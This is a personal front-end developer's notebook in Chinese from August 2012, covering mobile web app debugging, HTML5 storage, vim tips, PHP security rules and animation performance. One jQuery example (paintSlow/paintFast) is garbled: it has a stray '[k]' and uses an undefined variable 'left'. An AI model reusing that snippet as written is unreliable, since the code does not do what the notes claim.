autoHeight()，处理高度变化。三个页面同时进行，主要对iScroll的mask和滚动部分进行刷新。三个页面iScroll的热区高度都一样，都是window的高度减去工具条的高度。之所以这样，因为首页往上滚的时候总是会把头部隐藏。热区高度总设置为一个固定值，可以减少重复设置高度的性能损耗。

headerController控制头部的行为。

页面有两个更多按钮，分别用于首页和检索结果页。more1和more2
goTop也有两个。


window.onpageshow事件，回退时可能不执行onload事件，但是onpageshow事件可以使用。e.persisted属性？标识当前页面是否缓存。

贴吧用pushstate，而不是hash。对于浏览端和检索端打通的项目，估计可以参考。

图片resize优化
导航栏bug
loading页面可滚动，且保留底部内容
loading图标出来了
首页、详情页抖动问题，详情页不断振动的问题
scroll（0，0）问题

正文到列表先留白
列表和正文的正切、反切动画不对称
按scrollview来切换
滚动不稳定，动画连贯性需要重新搞
返回位置不稳定，可能一直在底部，或者有跳动
第一次列表页切屏会有文字重叠，海豚，chrome，QQ等。原生没问题





导航栏第一屏，以及最后一个“教育”在刷新后可以找回原位，其他分类不能找回原位。

ihaveu在当前屏先后迅速点击两个按钮，将出现混乱。你觉得它很稳定，其实不然。这么久才发现，也得出用户的操作还是比较中规中矩的。

google对快速的多次点击，只考虑第一次点击，忽略其他点击
2012/8/25
很多互相牵扯的问题能否通过某种机制管理起来，而不需要写很多fix的代码。比如初始化代码，需要多每种页面进行高度修正。每个可视的组件部分都有自治代码，对不同页面知道自己该如何展现。

重影问题，两层文字重叠，什么原因？

详情页，加载时的左右抖动。可能是图片的resize。上下抖动也有。

页面刚加载时，页面有抖动。可能是滚动到顶部与页面渲染之间凑到一起。滚动到顶部可以晚点

切换效果的实现，后面的完全出来前，前面的有一个提前隐藏的效果，体验感觉不好，有中断不顺畅的感觉。可能是400ms动画，300ms重置样式导致。

有scrollTo(0, 1), 也有scrollTo(0,0)


2012/8/24
HTML提供以下特性，使得离线web应用成为现实：
应用程序缓存，application cache
localstorage，web storage
web sql & indexedDB
online/offline events
以上特性还可以用于提升应用程序的性能。好文如下：
http://www.html5rocks.com/en/tutorials/offline/whats-offline/


HTML5离线技术，主要四种：
http://www.html5rocks.com/en/tutorials/offline/storage/
web storage，简单提供key-value的映射，目前只支持字符串到字符串之间的映射，需要进行序列化和反序列化操作，JSON.stringify和JSON.parse可以使用。优势是简单，浏览器支持好，缺点是缺乏索引，性能较低，非结构化，需要自己保证正确性和完整性。同步操作。
Web SQL Database，给了你SQL所拥有的能力，关系数据库一样。优势是支持主流移动浏览器，性能好的异步API，强大的查询性能，因为支持索引，鲁棒，数据完整性保证。劣势，已经弃用，工作组停掉这个方向了。学习成本高，需要SQL方面，关系数据库的知识。
Indexed Database，IndexedDB，介于Web Storage和Web SQL Database之间，兼有两者的特性，支持快速查找。优势是高性能的异步API，同步API亦支持，高性能的查询性能，支持敏捷开发，鲁棒，浏览器支持好，易上手。劣势是有点复杂的API，需要确保一致性和数据完整性，因为数据是非结构化的。可惜的是iOS5，android4都还不支持。
File Access，读取文件内容的JS API。甚至可以写文件，写的功能还在提议当中。优势是可以存储大文件，比如图片，视频，PDF等，高性能的异步API。劣势在于其还是一个刚起步的标准，仅chrome支持，没有内建的查询/索引支持。

tc-apptest-img08.vm机器有外网权限。
img09机器没有。

一个想法，通过代理服务器，模拟慢响应网络，慢速尚不支持。比如php的sleep()函数。

#_tv 是static定位
    #page-container 是absolute定位

列表页切换时，上部先有一段空白，不能稳定复现

正文页切回列表页时，会先有一片留白，体验不好，3GS。不是一个横切的过程，先把顶部展现，再下部列表切回来，把白色空间补上。

切换是否按照scrollview来进行，这样可以保证稳定性，不需要还原位置和resize，这些工作对性能有较大影响。

navigator使用了iScroll

多层view，使得大的新闻列表是现在内存中创建好整个DOM树，再往容器上append。
text页面一个model，对应newsTextMain这个view，有这个view再来创建下面的view。


图片加载完成之前，没有将其隐掉，可能会跳动，以及看到图片的resize

app.utils.loadThumbnail，用于加载缩略图，加入了加载失败的重试机制。

localstorage限制：
http://arty.name/localstorage.html
http://dev-test.nemikor.com/web-storage/support-test/

text页面，在image-load事件中需要调用setIscrollSize()，调整scroll的高度。特别对于多图片，且第一次加载的情况，会resize多次。影响性能。是否可以加载完成以后一次进行？多图的页面也不少。有些页面能达到10几次的resize。

$.ui.refresh对iScroll进行了封装。即使在正文页也是使用它，虽然将其隐藏。是否不太合理，不能直接使用iScroll？调用多次.refresh函数，该函数是否有性能问题？看了下内部实现，是直接调用iScroll的refresh，封装上没什么性能损耗。

切换栏目页，先白页面，出loading，获取成功以后，model通知view去render再突然出来新闻列表。感觉有点太快，瞬闪突兀的感觉。
白页面的时候，滚动区的长度太长，而且保留底部的文字，这时候用户可以滚动，感觉不好。

能否先别切，在当前页面上loading，好了以后再切。这是一个方案。

如果把render部分的代码用setTimeout，会慢很多，太慢了。
render的方式是这个dom树都建好以后，才往容器里面append，是否可以先把整个外面的节点先append到容器里，再一条一条的append数据呢？

我们的页面通过不断下拉，也会弄得很长，这时的性能怎么办？得有一个限度，像贴吧，有分页；或者向google mail，

加载更多新闻，ready的时候，会调用当前视图的model的add方法，且触发add事件，添加news，在调用iscroll的refresh。连search_refresh的也一起调用了（是否多余了？？？）。


比如newsList这个view的render里面需要关注search_refresh的状态，千丝万缕，不好维护。



2012/8/23
zepto中，不支持css(‘opacity’, 0)，非零值可以。

$pageToolbar问题，这种写法弄成全局变量，方式不好。

router的index等这些函数太复杂了，很难维护。

探测最新，顶部那块，#load-last

switchView方法，用于切屏。使用app.motions.screenTransition方法完成切屏动画。
动画实现使用transform，根据方向执行当前视图和下一视图的左移或者右移，支持时间轴动画。
 

loading图标露出来了。

#views是最外层的wrapper

gotop和gotops有什么区别？看起来都一样
一个首页一个检索结果页

this.switchingOrders记录不同类型过门动画，目前有main，index，text。main是页面框架的切换，index是首页列表的切换，text是正文页的切换。

router的正文入口：hashHandler page

发送统计请求
设置historyIndexState.type = "text"
#views置为0，0
#page-toolbar的顶部置为0
#_lv
    #page
#_tv
#page-container的顶部置为45px
    #tv-scroller
.loading-ui
header隐藏，公共头部
    .ui-header
    #search-form
    #menu
移除#page-container的错误提示，使用.error-bg类修饰，加载错误时才展示

查看视图缓存（cacheViews）中是否有当前URL的text视图，若无，则创建当前URL的视图。创建视图时，为每个视图的元素指定id为t_n，其中n为数字，从0-视图缓存的长度减1。然后把新创建的视图缓存起来。当前URL的视图用page保存。
将page.el添加到#tv-scroller下。

如果不是第一次访问，则将#_tv的position设为absolute，并置顶。400ms以后恢复position的默认设置。 why？

切换正文页视图：
    主框架切换组的当前视图存在，且该视图的id不等于缓存的#_tv的id，那么只需将当前page.el显示出来即可，主视图的切换这里先不管。此情况可能是首页或者检索结果页点击过来。
    否则，也即主框架切换组的当前视图不存在，或者存在情况下，但该视图的id等于缓存的#_tv视图的id，此时进行text组的过门切换。此情况可能是直接访问详情页。

切换主视图：
将#_tv的高度设置为window的高度
.loading-ui，loading图片若不存在，则创建之，append到#_tv下面
进行针对主框架的视图切换。this.switchView("main", app.cachedViews._tv);

#page-toolbar置顶。
    若工具条内容为空，则创建之
    如果字体菜单的视图没有缓存，则初始化字体菜单，并缓存成app.cacheViews.fontMenu
    将字体菜单隐藏
    子工具条隐藏



2012/8/22
$pageToolbar太不好理解了，而且是个封装方法的对象。初看以为是个zepto对象或者toolbar对象。

grep -P “\$pageToolbar” *
双引号会被重解析，需要写成\\\$pageToolbar
如果用单引号就没问题。

vim -O   # 打开垂直切分窗格
vim unix版：
下载源码安装包，vim-7.3.tar.bz2
安装很简单，简单配置一个./configure --prefix=... --enable-multibyte，然后make && make install即可，当然要保证gcc是有效的。还要注意--enable-multibyte选项，否则对中文支持不好， 那样enc, tenc, fenc, fencs等选项都不支持。

源码安装以后，vimfiles在安装目录下的share/vim/vim73下。
和windows的区别，windows下vimfiles在安装目录下，以vimfiles为目录名，vimrc文件也在安装目录下，以下划线开头，用户根目录下的~/.vimfiles也是运行时目录。linux的vimfiles在安装目录下的share/vim/vim73，vimrc文件以~/.vimrc形式存在。另外~/.vim目录也是运行时目录（通过查看runtimepath选项观察），该目录下有各类插件的目录，文档，语法文件等等，我们自己新增的插件可以放在该目录下。

vim开启语法高亮，使用:syntax on命令

查看vim的运行时目录，:set runtimepath

vim新插件安装，帮助文档融入工作，需要运行:helptags命令。做法是在~/.vim/doc目录下，启动vim，然后运行:helptags .

解决linux下vim中退格键无法使用的问题，设置backspace按键在insert模式下的行为：
set backspace=indent,eol,start 

set compatible的用处？

一个vim函数，编写代码折叠的文字显示方式。
:set foldtext=MyFoldText()
:function MyFoldText()
:  let line = getline(v:foldstart)
:  let sub = substitute(line, '/\*\|\*/\|{{{\d\=', '', 'g')
:  return v:folddashes . sub 
:endfunction

通过:help eval查找各类支持的函数。

vim表达式，=~表示正则匹配，!~表示正则不匹配
获得当前行，用表达式getline(‘.’)
获得当前行号，用line(‘.’)
更多可以通过命令:help eval找到。

global命令匹配所有行，:g/^/cmd

总是对行操作的三个命令，
:[range]co[py] {address}        # 拷贝
:t                          # 同copy
:[range]m[ove] {address}       # 移动

global命令与表达式配合：
:let i=0
:g/^/let i+=str2nr(getline('.'))
:echo i

针对global命令的好文：
http://kangzye.blog.163.com/blog/static/3681922320106223394858/

:let i=1 | g/\a/s/ \{8}/\=printf("\/* %2d *\/",i)/ | let i+=1

:help cmdline
查看命令行模式下的命令，执行的命令叫Ex命令（Ex commands）

查看pattern表达式，使用:help pattern


|，也叫做:bar，用于将命令分隔开，而不是pipe，这样就可以在一行中写多条命令。
一个容易引起迷惑的地方就是，跟在:g命令后面，是包含的，跟在:s命令后面，是不包含的。也即：
:%g/foo/p|>      # 将所有匹配行向右缩进
:%s/foo/bar/|>    # 替换完成后，只将最后一个匹配行向右缩进

args与argdo配合，对一批文件进行处理
:args *.c
:argdo set ff=unix | update

:r命令读取命令输出
:r !ls

pattern的特殊含义字符，加\以后有特殊含义，\v, \m, \V, \M四种pattern模式，默认是\m模式，也即magic模式。这种模式下，以下这些字符都是magic字符：

7个
$ . *
^ ~ [ ]
这几个字符，加\表示字面量，其他刚好相反。

其他字符，加\表示特殊含义，不加表示字面量。
\+，1或多个匹配
\=， 0或1个匹配
\?， 同\=，但不能用于使用？的后向查找
\{n,m}，匹配n到m次
\{n}， 匹配n次
\{n,}，匹配至少n次
\{-n,m}，匹配n到m次，尽可能少
\{-n,}，匹配至少n次，尽可能少
用减号表示非贪婪。}前面的\可加可不加，也即可以\{n,m}，也可以\{n,m\}
\1，模式中第一个\(\)匹配的内容一致


win shell
%*代表命令行参数

Linux shell
$, ${}用于变量替换
$*, $@ 位置参数。
  $0是命令名，$1, $2, ...对应每个参数
  $*对应参数列表，将$1,$2,...看作一个整体
  $@同$*，但其是用引号括起来的

$? 退出状态值变量
$$ 进程ID
() 命令组
2012/8/21
学习manifest，必须好好学习一下http://app.ft.com
<html id="html" manifest="/ftcachemanifest.manifest">

<link rel="dns-prefetch" href="//markets.ft.com">

curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5" http://m.baidu.com/news?tn=bdapifocus&act=json&time=&direct=0&rn=10 
curl命令，模拟iphone4的UA请求。使用-A选项。

php中更新文件，必须先写临时文件，再用rename/mv操作。切忌在原来的文件上做更新。
字符串用单引号而不是双引号，效率问题和安全问题的考虑

require/include尽可能不用，而用require_once/include_once
函数内部所有的全局变量必须写在最开头。
    global $g_count;

头文件中，全局变量必须使用$GLOBALS包含，避免在函数中require时，形成作用于问题。

数字使用intval过滤，数据库操作串，使用mysql_real_escape_string过滤

将register_global选项设置为Off，避免安全问题。如果为O、n，其会自动将$_GET, $_POST, $_COOKIE等里面的内容自动注册为全局变量。

将expose_php选项设置为Off，避免暴露php版本信息。

display_errors设置为Off

error_reporting设置为输出E_NOTICING级别的日志。
error_log 设置自定义错误日志路径

输入参数包含文件名的一部分，需要用白名单进行过滤。
输入参数作为system, exec, passthru的参数，需要用escapeshellarg过滤，而不是escapeshellcmd。

set names gbk
设置操作编码。可能会使addslashes函数误过滤。主要是\的编码刚好是合法的GBK第二个字节码，所以当进行逐字节过滤时，会将第二个字节变成\\，影响后续部分的解析。

php对远程文件include的支持，也是必须要考虑的安全问题。必须对文件名进行过滤。

用户提交的数据，不能随意拿来执行，也不能随意写入日志。比如日志，用户属于带\r\n等分隔符，写入日志，将破环日志结构。

配置文件不要放在svn中，避免不能保证最新和覆盖问题。
2012/8/20
http://www.lungojs.com
LUNGOJS，提供的JS框架，貌似和ihaveu使用的比较类似。不知ihaveu是否用的这个。

vim啊vim
2012/8/19
善用佳软：http://xbeta.info/
如何选择最佳的软件。

windows cmd下：
vim --version
可以输出vim的版本，以及编译和链接命令。
2012/8/18
npm install -g brunch
安装brunch
npm是node包管理的一个工具，目前还不是一个官方发布的工具，但是已经使用非常广泛。
http://registry.npmjs.org/， npm相关的注册信息接口。

brunch@1.4.1 postinstall C:\Users\Administrator\AppData\Roaming\npm\node_modules\brunch
安装在AppData下面。

brunch -v
1.4.1
brunch <command> --help
命令帮助
brunch new rootPath
新建一个project

brunch new d:/personal/mysites/tmp
生成特定格式的目录，app和vendor目录。创建应用可以使用
brunch build，需要现在项目的根目录下运行该命令。
运行完成，生成public目录。

还是在项目目录下，运行临时服务器。
brunch watch -s
自动监听某个端口，启动web简易服务器
brunch watch -s -m
输出压缩格式的代码，js和css的压缩


http://jashkenas.github.com/coffee-script/
coffeescript有更严格的语法，该语法编写的程序会编译成javascript。生成的js没有注释。
nodejs下安装，命令行：
npm install -g coffee-script
命令行中用coffee命令

coffee的编译器本身也是用coffee语言编写，使用Jison parser generator 生成。

coffee -c -o ./output ./src
将src目录下的所有.coffee编译，输出到output目录。

可以编译的使用，通过lint检查。-l选项。
-w --watch选项，可以监听文件的变化，即时更新编译。会启动一个监听服务。
coffee -w -c -o ./output ./src

coffee不会编译出==这样的表达式，都用===来代替，确保不会带来不确定性。
依赖nodejs，2009年开始coffeescript项目
2012/8/17
function drawArray(array) {
  for(var i = 0; i < array.length; i++) {
    document.getElementById('test').innerHTML += array[i]; // No good :(
  }
}
以上不好的编程方式，js执行时间实际上很少，大部分时间是与DOM交互等待的时间。

scripty2
http://scripty2.com/
http://scripty2.com/doc/
是一个JS效果库，依赖prototype.js, 1.7以后。对css3 transition有封装，如果有就直接用。提高动画体验。

YUI也提供了transition的封装。http://yuilibrary.com/yui/docs/transition/
Y.one('#demo').transition({
    easing: 'ease-out',
    duration: 0.75, // seconds
    width: '10px',
    height: '10px'
}, function() {
    this.remove();
});

jQuery的animate也提供了transition的封装。




中国市场201207移动平台占有率：
<div id="mobile_os-CN-monthly-201107-201207" width="600" height="400" style="width:600px; height: 400px;"></div><!-- You may change the values of width and height above to resize the chart --><p>Source: <a href="http://gs.statcounter.com/#mobile_os-CN-monthly-201107-201207">StatCounter Global Stats - Mobile OS Market Share</a></p><script type="text/javascript" src="http://www.statcounter.com/js/FusionCharts.js"></script><script type="text/javascript" src="http://gs.statcounter.com/chart.php?mobile_os-CN-monthly-201107-201207"></script>

百度移动‧百度云事业部2012Q2季度大会(上)
http://kan.baidu.com/play.html#id=23eddacb-7e9c-4768-b4f1-a640e0421d51
移动云李明远：
高频应用，用户体验的差异就很敏感，必须要做好。搜索就是高频应用。58同城，百姓等不是高频应用，用户对其体验的差异就没那么敏感，这个时候安全感会主导其使用的决策。一线工程师必须把好用户体验。
想方设法缩短用户到框的路径，在用户需要框的时候，框就在那了。
想方设法提升用户到达框以后的体验

robin：跟在别人后面做事，要么做不成，要么做的很累。

要发挥自己的优势，找到差异化，达到成本优势。

用户需求入口被分散，浏览器12.48分，其他应用102分

http://caniuse.com/
浏览器支持程度站点
分为几大块儿：HTML5，CSS，JS API， SVG，OTHER。SVG单独拎出来。

html-media-capture:
<input type="file" accept="image/*" capture="camera">
keyword: camera, camcorder, microphone, filesystem

http://www.miketaylr.com/code/input-type-attr.html
查看HTML5对input标签的属性支持程度。还会打印UA信息。
2012/8/16
提高HTML5 APP的性能：http://www.html5rocks.com/en/tutorials/speed/html5
HTML5的动画很好，但是也带来挑战。这些挑战Flash工程师也曾经遇到过。
30fps的动画比中间丢失几帧的60fps动画更好，用户很讨厌粗糙度。

视觉保真visual fidelity
硬件加速，使CPU的计算量转移到GPU，产生巨大的性能提升。
通用布局合成（compositing）
CSS3 transition
CSS3 3d transforms
canvas drawing
webgl 3d drawing
都可以通过GPU加速。

GPU加速将页面变成多个层，这些层相比需要加速的页面来说，是不变的，这些层按传统的渲染方式渲染。

js定时器启动动画，不能启动硬件加速。CSS3，将会启动硬件加速。
当前，大部分浏览器，仅当有个强信号指示使用硬件加速会有好效果时，才使用硬件加速。一个强信号就是3d动画，比如：
-webkit-transform: translateZ(0);
但需要注意的是，这个不一定就会带来性能的提升，可能使用与不使用的效果是一样的，而且使用了会带来更多电量的消耗。所以仅当你确认通过加速确实能带来性能的提升时，才使用。
transform functions：http://www.w3.org/TR/css3-transforms/
2d：matrix(a, b, c, d, e, f), translate(x,y), translateX(x), translateY(y), scale(sx,sy), scaleX(sx), scaleY(sy), rotate(angle), skewX(angle), skewY(angle)
angle的格式以deg为单位。
3d: matrix3d(a1-a16), translate3d(x,y,z), transateZ(z), scale3d(sx, sy, sz), scaleZ(sz), rotate3d(x, y, z, angle), rotateX(angle), rotateY(angle), rotateZ(angle), perspective(length)

rotateX(angle) == rotate(1, 0, 0, 30deg)，以x为轴旋转angle角度。
rotate(30deg) == rotateZ(30deg)
chrome基本上都支持。还没试过perspective，与矩阵转换。
写的时候，注意计量单位的添加，否则无效。距离px、em等，角度deg，百分比无单位。

CSS3 transition，由浏览器管理的动画，其性能也高。
使用scripty2，yui或者jquery等对transition有封装的库。

JS运行时间
便于js profile执行，可以使用js支持的命名表达式，跟踪匿名函数。如：
$('.stuff').each(function workOnStuff() { ... });
但这种方式会对全局有影响，要慎用。

DOM时间
function drawArray(array) {
  for(var i = 0; i < array.length; i++) {
    document.getElementById('test').innerHTML += array[i]; // No good :(
  }
}
以上不好的编程方式，js执行时间实际上很少，大部分时间是与DOM交互等待的时间。

缓存DOM操作的结果
innerHTML的+=操作，优化成先拼装好再赋值
读取一个DOM值再修改另一个DOM值的操作，中间不宜再插入其他读和写。应该全部读完，再全部写，这样效率高。更多阅读，关于重绘的效率：
http://calendar.perfplanet.com/2009/rendering-repaint-reflow-relayout-restyle/

function paintSlow() {
  var left1 = $('#thing1').css('left');
  $('#otherThing1').css('left', left);
  var left2 =[k] $('#thing2').css('left');
  $('#otherThing2').css('left', left);
}

function paintFast() {
  var left1 = $('#thing1').css('left');
  var left2 = $('#thing2').css('left');
  $('#otherThing1').css('left', left);
  $('#otherThing2').css('left', left);
}

重绘和事件循环
1. 当js动画循环执行的时间超过1/30s的时候，将不能达到流畅的动画效果。
2. setTimeout的延时，可能触发两次重绘，也会影响性能。

事件代理的两面性，使代码更简洁，但是也带来性能问题，特别是对频繁触发的事件更是如此。

有Flash的页面变慢，试着将flash的wmode设置为window。

localstorage操作，使得页面运行卡顿了。因为localstorage的操作是一个同步操作，如果在动画过程中有太多localstorage操作，就会影响性能。



phpui，无线架构调整，环境部署脚本，在db-news-fe3.vm机器上。/home/work/tobeonline目录下。
php安装是可以通过./configure的--with-config-file-path=PATH指定ini文件路径。
Set the path in which to look for php.ini [PREFIX/lib]
如果没有指定，默认目录是安装目录下的lib目录中，5.3.2至少是这样的。
如果指定的话，php编译以后，默认的ini文件路径可以指定在二进制文件中。如果将php安装目录修改以后，在新目录运行，就可能出现ini文件找不到的情况。

PPI计算，使用diagonal边来计算，例如小米手机2，屏幕对角尺寸为4.3inch，分辨率是1280*720，那么PPI=  ，视网膜屏的级别。


baiduTemplate模板，反馈调试最不方便。如何解决？三种方式，开关方式，函数调用方式，附加文件方式，正在评审中。。。

全公司在推广使用2.6.32内核：
从2012年Q2 开始，所有到货 的新机器全部使用2.6.32内核，包括即将上线的南京、杭州等机房；下半年，公 司也将全面升级老机器的内核

zepto的$.os.android在HTC G14的2.3.4上没用
大家使用$.os.android慎用
初步解决方案，不用其提供的正则来判断。

brunch
html5应用的快速构建工具，提供内置服务器和文件修改监听等功能。优势没有fis多。但也有fis可以借鉴的，比如脚手架，自动化测试，notify，文档，源概念。
http://fe.baidu.com/doc/fis/dev/brunch.html
1.  brunch官方网站：http://brunch.io 
2.  brunch详细文档：http://brunch.readthedocs.org/en/latest/index.html 
3.  github: https://github.com/brunch/brunch


2012/8/15
jsfiddle可以做演示程序嵌入页面，用作代码分享。只需写js。可以jslint检查。可以保存成短网址的页面。http://jsfiddle.net/
例子：http://paulirish.com/2011/requestanimationframe-for-smart-animating/

localstorage写性能优化建议：http://fe.baidu.com/doc/xiaoguang/web_storange/write.text
截止目前，我们可以看到，对于内容的重新设定，使用先清空，再设定新值， 整体的时间比 直接设定值要小。因为没有索引，不过这也看数据规模。


移动端广告形式。文字链广告、图片广告、动画广告。
文字链广告可以增加更多文字特效，比如阴影，旋转等
动画广告，可以使用HTML5动画技术。CSS3，Canvas在主流平台支持得都不错，SVG在Android新版（3.0以上）以及iOS支持得不错。但是对性能的影响、体验的影响可能阻碍移动动画广告的投放。

WHATWG主页：http://www.whatwg.org/
博客：http://www.whatwg.org/

W3C同时关注HTML，XML，XHTML的进程，进程比较慢。WHATWG专门关注HTML5，希望HTML5的进程能更快。2004年WHATWG介入HTML标准的推进，2007年W3C将其成果纳入为HTML5标准。Living Standards，表明其变化的特点，有bug了修，有新需求了加。7月20日，分裂为两个组织。今后可能有两种HTML5标准，浏览器厂商和开发者将要选择HTML5对于自身意味着什么。
Which HTML5? - WHATWG and W3C Split
http://www.i-programmer.info/news/191-htmlcss/4531-which-html5-whatwg-and-w3c-split.html

WHATWG的HTML标准：http://www.whatwg.org/html
今后HTML不再有版本号（http://www.cnblogs.com/lhb25/archive/2011/01/22/1941822.html），是一个活的标准。相比W3C更加成熟。
Living Standard — Last Updated 10 August 2012
Editor:
Ian Hickson, Google, ian@hixie.ch

W3C仍然维护其HTML5标准：http://www.w3.org/TR/html5/
，以期在某个时间推出完整的HTML5标准

两者的关系是Living Standard和Snapshot的关系。整体标准的结构和内容都是非常接近的。可看http://www.whatwg.org/html与http://www.w3.org/TR/html5/

相关FAQ：
http://wiki.whatwg.org/wiki/FAQ#WHATWG_and_the_W3C_HTML_WG
WHATWG 2004年创建，由Apple，Mozilla基金，Opera的一些个人组织创建的。这三家公司发现W3C对XHTML的倾向，而对HTML缺乏兴趣，对现实开发者需求的无视，由此组织起来，推动HTML标准的向前发展。目前主流移动浏览器应该是追随WHATWG的多。

WHATWG工作主要关注HTML标准，也包含Web Workers， Web Storage， Web Socket API，以及Server-Sent Events。有时，组织之外的一些标准也会在组织的邮件列表中出现。

贴吧webapp：http://wapp.baidu.com/mo/z/index

新同学过来，缺少可看的文档资料，即使有，也“年久失修”。产品线业务相关的介绍资料。
前端基础技术培训。新同学进来，没有这方面的培训。

业务介绍资料，前端基础技术培训。
版本号问题，屡犯，需要在第一个项目前就灌输好。

无线技术不成体系，需要梳理
2012/8/14
以下经典文章，尚需拜读：
提高HTML5 APP的性能：http://www.html5rocks.com/en/tutorials/speed/html5

如何使用requestAnimationFrame，创建智能动画：http://paulirish.com/2011/requestanimationframe-for-smart-animating/
Paul Irish，跟chrome、jquery、modernizr、css3 please、html rocks、html5 please等都有关，是个牛人。
浏览器会将并发的动画整合到一次重新渲染行为中，该API告诉开发者合适的渲染时机。同时，对于隐藏tab内的动画，浏览器不进行重新渲染，减少CPU，GPU，内存等的消耗。
性能优化：requestAnimationFrame是最佳实践之一，特别是对于canvas、svg、webgl等动画，CSS3的动画也是支持的，不过用得会少一点。

requestAnimationFrame是Mozilla提出的。

移动上，目前iOS5，Android4都不支持。

厂家前缀：
var vendors = ['ms', 'moz', 'webkit', 'o'];
极其精简的方式：
function(a,b){while(a--&&!(b=this["oR0msR0mozR0webkitR0r".split(0)[a]+"equestAnimationFrame"]));return b||function(a){setTimeout(a,15)}}(5)

调用方式是一个递归。
Paul Irish的实现：
// shim layer with setTimeout fallback
    window.requestAnimFrame = (function(){
      return  window.requestAnimationFrame       || 
              window.webkitRequestAnimationFrame || 
              window.mozRequestAnimationFrame    || 
              window.oRequestAnimationFrame      || 
              window.msRequestAnimationFrame     || 
              function( callback ){
                window.setTimeout(callback, 1000 / 60);
              };
    })();
 
 
    // usage: 
    // instead of setInterval(render, 16) ....
 
    (function animloop(){
      requestAnimFrame(animloop);
      render();
    })();
    // place the rAF *before* the render() to assure as close to 
    // 60fps with the setTimeout fallback.

Opera工程师Erik Möller的写法：提供了cancelAnimationFrame的方式。同时尽可能将动画圆整到60fps。
(function() {
    var lastTime = 0;
    var vendors = ['ms', 'moz', 'webkit', 'o'];
    for(var x = 0; x < vendors.length && !window.requestAnimationFrame; ++x) {
        window.requestAnimationFrame = window[vendors[x]+'RequestAnimationFrame'];
        window.cancelAnimationFrame = 
          window[vendors[x]+'CancelAnimationFrame'] || window[vendors[x]+'CancelRequestAnimationFrame'];
    }
 
    if (!window.requestAnimationFrame)
        window.requestAnimationFrame = function(callback, element) {
            var currTime = new Date().getTime();
            var timeToCall = Math.max(0, 16 - (currTime - lastTime));
            var id = window.setTimeout(function() { callback(currTime + timeToCall); }, 
              timeToCall);
            lastTime = currTime + timeToCall;
            return id;
        };
 
    if (!window.cancelAnimationFrame)
        window.cancelAnimationFrame = function(id) {
            clearTimeout(id);
        };
}());




HTML5最佳实践，来自肖广：http://fe.baidu.com/doc/xiaoguang/best/info.text

HTML5移动开发通用最佳实践：http://www.html5rocks.com/en/mobile/mobifying/
1. css media queries。比link标签的media属性更进一步，css3 media query可以在样式表中使用，针对屏幕尺寸，设备尺寸，方向等进行区分。http://www.w3.org/TR/css3-mediaqueries/
<link rel="stylesheet"
  media="handheld, only screen and (max-device-width: 320px)" href="phone.css">
only放在media query前面，使得不支持css3的浏览器忽略该规则。
<link rel="stylesheet"
  media="only screen and (min-width: 641px) and (max-width: 800px)" href="ipad.css">
<style>
  @media only all and (orientation: portrait) { ... }
</style>

对于media=”handheld”: iOS和Android会忽略之。具体情况先不了解了。
<!-- media="handheld" trick for Windows Mobile，大写的Screen -->
<link rel="stylesheet" href="screen.css" media="Screen">
<link rel="stylesheet" href="mobile.css" media="handheld">

HTML5ROCKS怎么用Meida Query：
<link rel="stylesheet"
  media="all" href="/static/css/base.min.css" />
<link rel="stylesheet"
  media="only screen and (max-width: 800px)" href="/static/css/mobile.min.css" />

2. 移动meta标签：
2.1 viewport meta
name-content pair，http-equiv-content pair
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
移动视窗，支持zoom。但是对于webapp应该阻止user-scalable。
android支持这个：
<meta name="viewport" content="target-densitydpi=device-dpi">
可取值：device-dpi, high-dpi, medium-dpi, low-dpi
如果需要针对不同屏幕分辨率进行设置，可以用：
-webkit-device-pixel-ratio或者window.devicePixelRatio属性，来设置target-densitydpi属性。
android开发参考：http://developer.android.com/reference/android/webkit/WebView.html

2.2. 全屏浏览
iOS特有的meta标签：
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
更多可以参考：http://developer.apple.com/library/safari/#documentation/AppleApplications/Reference/SafariHTMLRef/Articles/MetaTags.html
iOS特有的meta标签都列在这里。
除了以上主要还有：
<meta name="format-detection" content="telephone=no">
status-bar-style支持这些属性：
default，正常显示状态栏
black，状态栏黑色背景
 black-translucen，黑色且半透明
default和black，内容显示在状态栏下面，没有占满全屏。black-translucent，状态栏浮在内容上方，内容占据全屏。

2.3 快捷图标
用link标签，ios支持rel=”apple-touch-icon”
android支持rel=”appple-touch-icon-precomposed”
<link rel="apple-touch-icon"
      href="/static/images/identity/HTML5_Badge_64.png" />
<link rel="apple-touch-icon-precomposed"
      href="/static/images/identity/HTML5_Badge_64.png" />

3. 垂直布局
单列垂直布局适合移动设备。在不改变标签的情况下，用css支持

4. 移动优化
通用的最佳实践可见此处：https://developers.google.com/speed/docs/best-practices/rules_intro?hl=zh-CN，除此之外：
4.1 自动隐藏的地址栏
 
window.addEventListener('load', function(e) {
    setTimeout(function() { window.scrollTo(0, 1); }, 1);
  }, false);

4.2 降低网络请求，节省带宽
移动设备浏览器的并发连接数减少。
不要使用iframe， iframe速度慢。
不要把不适合移动设备的内容只做隐藏操作，因为相关资源同样会请求
应用缓存（application cache），不仅提供离线支持，而且支持更快的启动
css/js压缩，推荐使用yui，通吃css和js。但是yui 2.4.2对media query的压缩会有问题，推荐使用2.4.4+
css sprite
使用pngcrush，进行图片压缩
对小图片使用dataURI，base64编码增加了大约30%的尺寸，但是减少了网络请求
Modernizr等库，会有额外开销，只在需要的时候才引入

其他：
js尽可能移至底部
去除内联style标签
缓存DOM查找，最小化DOM操作，避免DOM操作引来的reflow
将一些浪费性能的代码放到服务端去，例如：
var lis = document.querySelectorAll('header nav li');
var i = lis.length;
while (i--) {
  var a = lis[i].querySelector('a');
  var section = a.getAttribute("data-section");
  if (new RegExp(section).test(document.location.href)) {
    a.className = 'current';
  }
}

4.3 应用缓存
首先保证manifest文件不被缓存，如果被缓存，那么调试起来将是一场噩梦
其次用JS API提示用户新的版本可用。
window.applicationCache.addEventListener('updateready', function(e) {
  if (window.applicationCache.status == window.applicationCache.UPDATEREADY) {
    window.applicationCache.swapCache();
    if (confirm('A new version of this site is available. Load it?')) {
      window.location.reload();
    }
  }
}, false);



触摸事件app最佳实践：http://www.html5rocks.com/en/mobile/touch/
1. 阻止缩放，使用viewport meta标签。
<meta name="viewport" 
  content="width=device-width, initial-scale=1.0, user-scalable=no">
